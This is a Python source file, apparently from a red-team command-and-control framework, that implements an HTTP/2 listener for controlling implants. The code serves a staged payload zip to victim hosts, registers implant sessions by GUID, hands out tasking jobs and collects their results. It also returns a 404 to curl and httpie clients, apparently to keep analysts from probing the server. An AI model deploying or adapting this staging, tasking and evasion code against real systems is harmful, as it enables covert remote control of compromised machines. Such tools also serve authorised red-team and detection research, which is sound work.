import ssl
import json
import sys
import asyncio
import logging
import core.state as state
from core.events import NEW_SESSION, SESSION_STAGED, SESSION_CHECKIN, JOB_RESULT
from core.listener import Listener
from core.session import Session
from core.utils import get_ipaddress, gen_random_string, check_valid_guid
from logging import Formatter
from io import BytesIO
from zipfile import ZipFile, ZIP_DEFLATED
from base64 import b64encode
from pprint import pprint
from quart import Quart, Blueprint, request, jsonify, Response
from quart.logging import default_handler, serving_handler


class STListener(Listener):
    def __init__(self):
        Listener.__init__(self)
        self.name = 'http2'
        self.author = '@byt3bl33d3r'
        self.description = 'HTTP/2 listener'

        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name': {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http/2'
            },
            #'Host': {
            #    'Description'   :   'Hostname/IP for staging.',
            #    'Required'      :   True,
            #    'Value'         :   f"https://{get_ipaddress()}"
            #},
            'BindIP': {
                'Description'   :   'The IPv4/IPv6 address to bind to.',
                'Required'      :   True,
                'Value'         :   get_ipaddress()
            },
            'Port': {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   443
            },
            'Cert': {
                'Description'   :   'SSL Certificate file',
                'Required'      :   False,
                'Value'         :   'data/cert.pem'
            },
            'Key': {
                'Description'   :   'SSL Key file',
                'Required'      :    False,
                'Value'         :   'data/key.pem'
            }
        }

    def run(self):
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_COMPRESSION
        ssl_context.set_ciphers('ECDHE+AESGCM')
        ssl_context.load_cert_chain(certfile=self['Cert'], keyfile=self['Key'])
        ssl_context.set_alpn_protocols(['h2'])  # Only http/2

        """
        While we could use the standard decorators to register these routes, 
        using add_url_rule() allows us to create diffrent endpoint names
        programmatically and pass the classes self object to the routes
        """

        loop = asyncio.get_event_loop()

        http_blueprint = Blueprint(__name__, 'http')
        http_blueprint.before_request(self.check_if_naughty)
        http_blueprint.after_request(self.make_normal)

        http_blueprint.add_url_rule('/stage.zip', 'stage', self.stage, methods=['GET'])
        http_blueprint.add_url_rule('/<GUID>', 'first_checkin', self.first_checkin, methods=['POST'])
        http_blueprint.add_url_rule('/<GUID>/jobs', 'jobs', self.jobs, methods=['GET'])
        http_blueprint.add_url_rule('/<GUID>/jobs/<job_id>', 'job_result', self.job_result, methods=['POST'])

        # Add a catch all route
        http_blueprint.add_url_rule('/', 'unknown_path', self.unknown_path, defaults={'path': ''})
        http_blueprint.add_url_rule('/<path:path>', 'unknown_path', self.unknown_path, methods=['GET', 'POST'])

        self.app = Quart(__name__)

        logging.getLogger('quart.app').setLevel(logging.DEBUG if state.args['--debug'] else logging.ERROR)
        logging.getLogger('quart.serving').setLevel(logging.DEBUG if state.args['--debug'] else logging.ERROR)

        self.app.register_blueprint(http_blueprint)
        self.app.run(host=self['BindIP'],
                     port=self['Port'],
                     debug=False,
                     ssl=ssl_context,
                     use_reloader=False,
                     access_log_format='%(h)s %(p)s - - %(t)s statusline: "%(r)s" statuscode: %(s)s responselen: %(b)s protocol: %(H)s',
                     loop=loop)

    async def check_if_naughty(self):
        try:
            headers = request.headers['User-Agent'].lower()
            if 'curl' in headers or 'httpie' in headers:
                return jsonify({}), 404
        except KeyError:
            pass

    async def make_normal(self, response):
        #response.headers["server"] = "Apache/2.4.35"
        return response

    async def stage(self):
        with open('data/stage.zip', 'rb') as stage_file:
            stage_file = BytesIO(stage_file.read())
            with ZipFile(stage_file, 'a', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
                zip_file.write("data/stage.py", arcname="Main.py")

            self.dispatch_event(SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {request.remote_addr} ...')
            return Response(stage_file.getvalue(), content_type='application/zip')

    @check_valid_guid
    async def first_checkin(self, GUID):
        data = json.loads(await request.data)
        self.dispatch_event(NEW_SESSION, Session(GUID, request.remote_addr, data))
        return jsonify({}), 200

    @check_valid_guid
    async def jobs(self, GUID):
        self.app.logger.debug(f"Session {GUID} ({request.remote_addr}) checked in")
        job = self.dispatch_event(SESSION_CHECKIN, (GUID, request.remote_addr))
        if job:
            return jsonify(job), 200

        self.app.logger.debug(f"No jobs to give {GUID}")
        return jsonify({}), 200

    @check_valid_guid
    async def job_result(self, GUID, job_id):
        self.app.logger.debug(f"Session {GUID} posted results of job {job_id}")
        data = json.loads(await request.data)
        self.dispatch_event(JOB_RESULT, (GUID, data))

        return jsonify({}), 200

    async def unknown_path(self, path):
        self.app.logger.error(f"Unknown path: {path}")
        return jsonify({}), 404
